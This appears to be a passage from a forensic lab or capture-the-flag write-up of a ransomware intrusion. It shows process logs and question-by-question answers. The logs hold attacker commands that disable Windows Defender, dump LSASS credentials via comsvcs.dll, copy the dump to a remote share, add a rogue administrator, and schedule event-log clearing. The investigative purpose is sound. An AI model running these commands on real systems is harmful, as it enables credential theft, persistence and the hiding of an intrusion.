| 2024-09-18 11:42:27    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 5416      | 8eef5967-bca3-66ea-7201-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "sc" qc WinDefend                                                                                                     |
| 2024-09-18 11:44:16    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:44:16    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 2600      | 8eef5967-bd10-66ea-7601-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "reg" add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f              |
| 2024-09-18 11:45:06    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:45:06    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 5344      | 8eef5967-bd42-66ea-7a01-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "powershell.exe" -command "rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\windows\temp\lsass.dmp full" |
| 2024-09-18 11:45:07    | 1208  | CYDEF\Administrator   | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | 3968      | 8eef5967-bd42-66ea-7c01-000000000b00         | "powershell.exe" -command "rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\windows\temp\lsass.dmp full" | "C:\Windows\system32\rundll32.exe" c:\Windows\System32\comsvcs.dll MiniDump 684 C:\windows\temp\lsass.dmp full        |
| 2024-09-18 11:46:20    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:46:20    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 1520      | 8eef5967-bd8c-66ea-7f01-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "cmd.exe" /c "net use Z: \\HelpDesk\Dump_out"                                                                         |
| 2024-09-18 11:46:20    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 4704      | 8eef5967-bd8c-66ea-8101-000000000b00         | "cmd.exe" /c "net use Z: \\HelpDesk\Dump_out"                       | net  use Z: \\HelpDesk\Dump_out                                                                                       |
| 2024-09-18 11:48:25    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:48:25    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 3096      | 8eef5967-be09-66ea-8401-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "cmd.exe" /c "xcopy C:\windows\temp\lsass.dmp Z:\lsass.dmp /Y"                                                        |
| 2024-09-18 11:48:25    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 3184      | 8eef5967-be09-66ea-8601-000000000b00         | "cmd.exe" /c "xcopy C:\windows\temp\lsass.dmp Z:\lsass.dmp /Y"      | xcopy  C:\windows\temp\lsass.dmp Z:\lsass.dmp /Y                                                                       |
| 2024-09-18 11:49:44    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\svchost.exe               | 424       | 8eef5967-b29f-66ea-1300-000000000b00         | C:\Windows\system32\svchost.exe -k netsvcs -p                      | C:\Windows\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations                                              |
| 2024-09-18 11:50:10    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\svchost.exe               | 424       | 8eef5967-b29f-66ea-1300-000000000b00         | C:\Windows\system32\svchost.exe -k netsvcs -p                      | taskhostw.exe NGCKeyPregen                                                                                            |
| 2024-09-18 11:50:11    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:50:11    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 4136      | 8eef5967-be73-66ea-8b01-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "cmd.exe" /c "net user"                                                                                               |
| 2024-09-18 11:50:11    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 4756      | 8eef5967-be73-66ea-8d01-000000000b00         | "cmd.exe" /c "net user"                                           | net  user                                                                                                             |
| 2024-09-18 11:50:11    | 1208  | CYDEF\Administrator   | C:\Windows\System32\net.exe                   | 5820      | 8eef5967-be73-66ea-8f01-000000000b00         | net  user                                                         | C:\Windows\system32\net1  user                                                                                         |
| 2024-09-18 11:50:17    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\winlogon.exe              | 600       | 8eef5967-b29e-66ea-0a00-000000000b00         | winlogon.exe                                                      | "LogonUI.exe" /flags:0x0 /state0:0xa38b8055 /state1:0x41c64e6d                                                        |
| 2024-09-18 11:50:17    | 1208  | CYDEF\Administrator   | C:\Windows\System32\svchost.exe               | 424       | 8eef5967-b29f-66ea-1300-000000000b00         | C:\Windows\system32\svchost.exe -k netsvcs -p                      | taskhostw.exe KEYROAMING                                                                                              |
| 2024-09-18 11:50:26    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:50:26    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 3632      | 8eef5967-be82-66ea-9401-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "cmd.exe" /c "net user /domain"                                                                                       |
| 2024-09-18 11:50:26    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 2620      | 8eef5967-be82-66ea-9601-000000000b00         | "cmd.exe" /c "net user /domain"                                   | net  user /domain                                                                                                     |
| 2024-09-18 11:50:26    | 1208  | CYDEF\Administrator   | C:\Windows\System32\net.exe                   | 3516      | 8eef5967-be82-66ea-9801-000000000b00         | net  user /domain                                                 | C:\Windows\system32\net1  user /domain                                                                               |
| 2024-09-18 11:51:41    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:51:41    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 2036      | 8eef5967-becd-66ea-9a01-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "cmd.exe" /c "net user ITadmin_2 p@ssw00rd /add && net localgroup Administrators ITadmin_2 /add"                      |
| 2024-09-18 11:51:41    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 1144      | 8eef5967-becd-66ea-9c01-000000000b00         | "cmd.exe" /c "net user ITadmin_2 p@ssw00rd /add && net localgroup Administrators ITadmin_2 /add" | net  user ITadmin_2 p@ssw00rd /add                                                                                    |
| 2024-09-18 11:51:41    | 1208  | CYDEF\Administrator   | C:\Windows\System32\net.exe                   | 3872      | 8eef5967-becd-66ea-9e01-000000000b00         | net  user ITadmin_2 p@ssw00rd /add                                 | C:\Windows\system32\net1  user ITadmin_2 p@ssw00rd /add                                                               |
| 2024-09-18 11:51:41    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 1144      | 8eef5967-becd-66ea-9c01-000000000b00         | "cmd.exe" /c "net user ITadmin_2 p@ssw00rd /add && net localgroup Administrators ITadmin_2 /add" | net  localgroup Administrators ITadmin_2 /add                                                                         |
| 2024-09-18 11:51:41    | 1208  | CYDEF\Administrator   | C:\Windows\System32\net.exe                   | 2596      | 8eef5967-becd-66ea-a001-000000000b00         | net  localgroup Administrators ITadmin_2 /add                       | C:\Windows\system32\net1  localgroup Administrators ITadmin_2 /add                                                    |
| 2024-09-18 11:52:13    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:52:14    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 5664      | 8eef5967-beed-66ea-a201-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "cmd.exe" /c "net user"                                                                                               |
| 2024-09-18 11:52:14    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 3788      | 8eef5967-beee-66ea-a401-000000000b00         | "cmd.exe" /c "net user"                                           | net  user                                                                                                             |
| 2024-09-18 11:52:14    | 1208  | CYDEF\Administrator   | C:\Windows\System32\net.exe                   | 1264      | 8eef5967-beee-66ea-a601-000000000b00         | net  user                                                         | C:\Windows\system32\net1  user                                                                                         |
| 2024-09-18 11:55:11    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:55:11    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 1544      | 8eef5967-bf9f-66ea-a801-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "cmd.exe" /c "schtasks /create /sc daily /tn 'SystemMaintenance' /tr 'powershell.exe -ExecutionPolicy Bypass -Command Clear-EventLog -LogName Security, System' /ru SYSTEM" |
| 2024-09-18 11:55:11    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 5204      | 8eef5967-bf9f-66ea-aa01-000000000b00         | "cmd.exe" /c "schtasks /create /sc daily /tn 'SystemMaintenance' /tr 'powershell.exe -ExecutionPolicy Bypass -Command Clear-EventLog -LogName Security, System' /ru SYSTEM" | schtasks  /create /sc daily /tn 'SystemMaintenance' /tr 'powershell.exe -ExecutionPolicy Bypass -Command Clear-EventLog -LogName Security, System' /ru SYSTEM |
| 2024-09-18 11:57:12    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:57:12    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 4684      | 8eef5967-c018-66ea-ad01-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "cmd.exe" /c "schtasks /create /sc daily /tn 'SystemMaintenance' /tr 'powershell.exe -ExecutionPolicy Bypass -Command \" Clear-EventLog -LogName Security "System\' /ru SYSTEM" |
| 2024-09-18 11:57:12    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 3168      | 8eef5967-c018-66ea-af01-000000000b00         | "cmd.exe" /c "schtasks /create /sc daily /tn 'SystemMaintenance' /tr 'powershell.exe -ExecutionPolicy Bypass -Command \" Clear-EventLog -LogName Security "System\' /ru SYSTEM" | schtasks  /create /sc daily /tn 'SystemMaintenance' /tr 'powershell.exe -ExecutionPolicy Bypass -Command \" Clear-EventLog -LogName Security "System\' /ru SYSTEM |

**Q5. Identifying the attacker's initial commands reveals their intentions and the level of access they gained. What was the first command executed remotely to begin system enumeration?**

See above!

**Q6. Understanding how the attacker disabled security measures is key to assessing how they gained persistence and weakened the system's defenses. The attacker used a remote execution tool, which generates a different Process ID (PID) for each command executed. What is the Process ID (PID) of the first command used to turn off Windows Defender?**

See the table in Q4.

**Q7. Identifying changes to the system's registry is essential for understanding how the attacker disabled security features, allowing malicious actions to proceed undetected. In an attempt to disable Windows Defender, the attacker modified a specific registry value. What is the name of the registry value that was added or modified under HKLM\SOFTWARE\Policies\Microsoft\Windows Defender?**

See the table in Q4.

**Q8. Understanding how the attacker leveraged specific system files is crucial, as it can reveal their methods for accessing sensitive data and escalating privileges. What DLL file did the attacker use in the PowerShell command to dump the targeted process for further exploitation?**

See the table in Q4.

**Q9. Investigating the creation of new accounts is crucial for identifying how the attacker maintains unauthorized access to the system. To establish persistent access, the attacker created a new user account on the compromised system. What is the name of the account that the attacker created?**

See the table in Q4.

**Q10. Identifying the URL in the ransom note is vital for understanding the attacker's communication and data exposure threats. The attacker included a link to their blog where stolen data would be published if negotiations fail. What is the URL provided for communication and accessing the attacker's chat?**

I start by using bstrings:

```
bstrings -f "C:\Users\Administrator\Desktop\Start Here\Artifacts\memory.dmp" --ls URL -o "C:\Users\Administrator\Desktop\out.txt"
```

Which takes a long time, more than 45 minutes. While it was running, I went to grab a coffee, then:

- I looked for other locations where this might be stored, ie, Sysmon Event ID 11 (File created) which logs file creation events with process path (image), process ID, and target filenames. Unfortunately, I was unable to find a ransom note file in the dump.
- I double-checked the 'psxview' plugin results, and confirmed that I hadn't seen a browser process in it earlier.
- I also looked for a browser database file in the 'filescan' plugin results, but I didn't locate anything.
- I considered running the 'netscan' plugin (I probably should have done this in the beginning), but I didn't want to slow down the bstrings search -- it had already been running for over 15 minutes and started work on the third of five chunks.
- I reviewed the bstrings output, searching for keywords like "http", "https", ".onion" with some hits, but it wasn't clear to me how to connect these strings to the actual note.
- Having exhausted my options (and hints!), I moved to looking for a write-up about the Akira ransomware, assuming this was a real piece of malware. I found a CISA write-up, but it didn't contain any links. After reviewing a few more write-ups, I landed on the following that describes the ransom note in detail and includes some URLs: https://www.lab539.com/blog/inside-akira-ransomware-negotiations !
